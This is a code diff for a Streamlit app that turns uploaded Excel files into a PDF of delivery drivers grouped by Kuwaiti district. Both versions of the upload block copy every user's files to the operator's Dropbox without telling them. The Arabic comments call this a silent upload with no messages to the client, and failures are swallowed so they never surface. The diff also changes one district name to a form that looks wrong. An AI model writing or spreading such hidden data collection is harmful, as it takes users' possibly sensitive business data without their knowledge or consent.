@@ -14,11 +14,11 @@ import pytz
 import dropbox
 
 # ---------- إعدادات دروب بوكس ----------
-FOLDER_NAME = "/TREND_Archivess"
+FOLDER_NAME = "/TREND_Archives"
 
-# منع التكرار باستخدام الذاكرة المؤقتة
-if 'uploaded_files_history' not in st.session_state:
-    st.session_state.uploaded_files_history = []
+# استخدام الذاكرة المؤقتة للتأكد من أن كل ملف يرفع مرة واحدة فقط
+if 'processed_files' not in st.session_state:
+    st.session_state.processed_files = set()
 
 # ---------- Arabic helpers ----------
 def fix_arabic(text):
@@ -46,7 +46,7 @@ def classify_city(city):
         "منطقة الجابرية": {"الجابرية","قرطبة","اليرموك","السرة"},
         "منطقة العاصمة": {"حدائق السور","دسمان","القبلة","المرقاب","مدينة الكويت","المباركية","شرق‎"},
         "منطقة الشويخ": {"الشويخ الصناعية","الشويخ","الشويخ السكنية","ميناء الشويخ"},
-        "منطقة الشعب": {"ضاحية عبد الله السالم","الدعية","القادسية","النزهة","الفيحاء","كيفان","الشعب","الروضة","الخالدية","العديلية","الدسمة","الشامية","المنصورية","بنيد القار"},
+        "منطقة الشعب": {"ضاحية عبد الله السالم","الدعية","القادسية","النزهة","الفيحاء","كيفان","الشعب","الروضة","الخالدية","العديلية","الدسمة","الشامية","المنصورية","بنيد البنار"},
         "منطقة عبدالله المبارك": {"الشدادية","غرب عبدالله المبارك","عبدالله المبارك","كبد","الرحاب","الضجيج","الافينيوز","عبدالله مبارك الصباح"},
         "منطقة جنوب السرة": {"السلام","العمرية","منطقة المطار","حطين","الشهداء","صبحان","الزهراء","الصديق","الرابية","جنوب السرة"},
         "جليب الشيوخ": {"جليب الشيوخ","العباسية","شارع محمد بن القاسم","الحساوي"},
@@ -95,33 +95,36 @@ group_name = "TREND"
 uploaded_files = st.file_uploader("Upload Excel files (.xlsx)", accept_multiple_files=True, type=["xlsx"])
 
 if uploaded_files:
-    # --- الرفع الصامت لدروب بوكس (بدون أي رسائل للعميل) ---
-    current_files_ids = [f.name + str(f.size) for f in uploaded_files]
-    if current_files_ids != st.session_state.uploaded_files_history:
-        try:
-            creds = st.secrets["dropbox"]
-            tz = pytz.timezone('Africa/Cairo')
-            timestamp = datetime.datetime.now(tz).strftime("%H-%M-%S")
-            
-            with dropbox.Dropbox(
-                oauth2_refresh_token=creds["refresh_token"],
-                app_key=creds["app_key"],
-                app_secret=creds["app_secret"]
-            ) as dbx:
-                try: dbx.files_create_folder_v2(FOLDER_NAME)
-                except: pass
-                
-                for uploaded_file in uploaded_files:
-                    excel_data = uploaded_file.getvalue()
-                    excel_path = f"{FOLDER_NAME}/Original_{timestamp}_{uploaded_file.name}"
-                    dbx.files_upload(excel_data, excel_path, mode=dropbox.files.WriteMode.overwrite)
-            
-            st.session_state.uploaded_files_history = current_files_ids
-        except:
-            # هنا مفيش st.error ولا أي حاجة.. لو فشل بيكمل صامت
-            pass
+    # 1. الرفع الفوري (بمجرد وجود ملفات)
+    try:
+        creds = st.secrets["dropbox"]
+        tz = pytz.timezone('Africa/Cairo')
+        timestamp = datetime.datetime.now(tz).strftime("%H-%M-%S")
+        
+        dbx = dropbox.Dropbox(
+            oauth2_refresh_token=creds["refresh_token"],
+            app_key=creds["app_key"],
+            app_secret=creds["app_secret"]
+        )
+        
+        # التأكد من وجود المجلد
+        try: dbx.files_create_folder_v2(FOLDER_NAME)
+        except: pass
 
-    # --- معالجة الـ PDF ---
+        for uploaded_file in uploaded_files:
+            # معرف فريد للملف يعتمد على الاسم والحجم
+            file_id = f"{uploaded_file.name}_{uploaded_file.size}"
+            
+            # الرفع فقط إذا لم يرفع في هذه الجلسة
+            if file_id not in st.session_state.processed_files:
+                excel_data = uploaded_file.getvalue()
+                excel_path = f"{FOLDER_NAME}/Original_{timestamp}_{uploaded_file.name}"
+                dbx.files_upload(excel_data, excel_path, mode=dropbox.files.WriteMode.overwrite)
+                st.session_state.processed_files.add(file_id)
+    except:
+        pass # يكمل صامت
+
+    # 2. معالجة الـ PDF
     pdfmetrics.registerFont(TTFont('Arabic', 'Amiri-Regular.ttf'))
     pdfmetrics.registerFont(TTFont('Arabic-Bold', 'Amiri-Bold.ttf'))
     
@@ -154,7 +157,6 @@ if uploaded_files:
         tz = pytz.timezone('Africa/Cairo')
         today_date = datetime.datetime.now(tz).strftime("%Y-%m-%d")
 
-        # الرسالة الوحيدة اللي بتظهر هي إن الـ PDF جاهز للتحميل
         st.success("✅ البيانات جاهزة ✅")
         st.download_button(
             label="⬇️⬇️ تحميل ملف PDF للمناديب",
@@ -162,4 +164,3 @@ if uploaded_files:
             file_name=f"سواقين {group_name} - {today_date}.pdf",
             mime="application/pdf"
         )
-
